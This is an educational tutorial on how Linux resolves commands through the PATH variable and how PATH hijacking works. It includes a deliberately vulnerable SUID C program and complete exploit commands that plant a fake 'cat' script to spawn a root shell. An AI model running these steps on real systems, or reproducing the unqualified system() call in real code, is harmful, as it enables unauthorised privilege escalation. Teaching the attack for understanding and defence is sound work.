# PATH Hijacking

## What is the PATH?

When you launch a program, for example in the shell, you typically
just write the name of the program. For example, if I want to list out
all the files in a given directory, I can use the *ls* program as
follows

```sh
$ ls
content  public  thumbnail  video
```
Now, how does the shell process know which command to execute?
Remember that in modern operating systems, resources are located in
specific paths of a file system. All sorts of resources are located
like that. Even binaries, which are the programs we use to do
various activities.

This means that before executing the command, the shell needs to
resolve its full path, that is, it needs to know where does the
program reside within the file system. This is where the concept of
a PATH comes in.

**IMPORTANT**: The PATH is an environment variable, found within the
shell and other processes as well, which determines the folders to
look in order to resolve command names into full paths.

In order to print the value of the PATH, within the shell `bash` we
can execute the following command

```sh
$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/bin:/opt/cuda/bin:/opt/cuda/nsight_compute:/opt/cuda/nsight_systems/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl:/usr/lib/rustup/bin:/home/leo/utils/:/home/leo/go/bin/
```
Notice here that `echo` is the command used to print stuff to the
console, and `$PATH` is the name of the environment variable which
contains the PATH.

As you can see, the PATH is actually a list of directory paths,
separated with colons. If we were to list out the paths in the
previous output we'd obtain the following list

```
/usr/local/sbin
/usr/local/bin
/usr/bin
/opt/cuda/bin
/opt/cuda/nsight_compute
/opt/cuda/nsight_systems/bin
/usr/lib/jvm/default/bin
/usr/bin/site_perl
/usr/bin/vendor_perl
/usr/bin/core_perl
/usr/lib/rustup/bin
/home/leo/utils/
/home/leo/go/bin/
```

Now, how is PATH used? Simple, when you launch a program without a
full path, such as when we just executed the command *ls*, the shell
will use this list of folders in order to look for the ls binary. It
will start from the first folder, and, until it has found an ls
binary, it will keep looking for further folders, until all of them
have been checked.

In the case of `ls`, it will do the following

1. First it checks if in the folder `/usr/local/sbin` there is the
binary `ls`, that is, it checks for the existence of the file

```
/usr/local/sbin/ls
```

Since there is no such file in our current file system, it keeps
going and checks for the next directory.

2. The second directory is `/usr/local/bin`, and so the shell checks for the existence of the file

```
 /usr/local/bin/ls
```
Since there is no such file in our current file system, it keeps going and checks for the next directory.

3. The third directory is ~/usr/bin~, and so the shell checks for the existence of the file

```
/usr/bin/ls
```

Since there is such file in our current file system, it loads the file in memory and it executes it.
Indeed, notice that if we execute `ls` or we execute `/usr/bin/ls` with its ful path, we get the same output

```sh
$ ls
content  public  thumbnail  video

$ /usr/bin/ls
content  public  thumbnail  video
```

To understand how a given command is resolved, we can use the binary
`which`. This binary uses the PATH in exactly the same we just
described in order to print out the full path of the command.

```
$ which ls
/usr/bin/ls
```

## PATH Hijacking
Having described what is the PATH, we can know understand the
dynamics of the *PATH Hijacking* attack.

Let's say we have the following C program called `reader.c`.

```c
// gcc reader.c -o reader

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

char *VALID_FILES[] = { "01.txt", "02.txt" };
int valid_files_count = 2;

int main(int argc, char **argv) {

  if (argc < 2) {
    fprintf(stderr, "[INFO]: Usage %s <filename>\n");
    return -1;
  }

  char *user_filename = argv[1];

  for (int i = 0; i < valid_files_count; i++) {
    char *valid_filename = VALID_FILES[i];
    int length = strlen(valid_filename);

    if (!strncmp(user_filename, valid_filename, length)) {
      char cmd[42] = {0};
      sprintf(cmd, "cat ./archive/%s", user_filename);
      setuid(0);
      setgid(0);
      system(cmd);
      return 0;
    }
  }

  printf("[INFO]: No file with such names were found.\n");
  
  return 0;
}

```
  
We can compile the program and make it a SUID binary owned by the `root` user as follows

```sh
gcc reader.c -o reader && sudo chown root reader && sudo chmod +s reader
```

As we can see, the program is used to read some files within an
archive directory, where archive contains a bunch of files which can
only be access by root, or by the program itself in read only mode.

```sh
$ sudo tree -L 2
.
├── archive
│   ├── 01.txt
│   ├── 02.txt
│   └── 03.txt
├── notes.org
├── reader
└── reader.c
```

The program just shown is vulnerable to PATH hijacking. Notice how the
program makes use of the `cat` binary in order to print out the
contents of the file. Specifically, notice how cat is called: no full
path is given, therefore the path that used to find the binary will be
computed at runtime using the PATH environment variable. And this is
why the program is vulnerable and can be exploited.

Before calling the binary, an attacker can set a specific environment PATH, and the vulnerable program will use that to find the cat binary. An attacker can then create a malicious binary or script called `cat` and place it within the first folder of the path. When the program will execute, it will find the attacker's malicious code, and not the original cat.

In the example shown above, the attacker can do the following

1. Create a malicous bash script and call it `cat` within the current folder

```sh
echo -en '#!/usr/bin/env sh\n/bin/bash\n' > cat
chmod +x cat
```
2. Launch the program with a malicious PATH variable

```sh
PATH=.:$PATH ./reader 01.txt
```

3. Enjoy the profit

```
# whoami
root
```
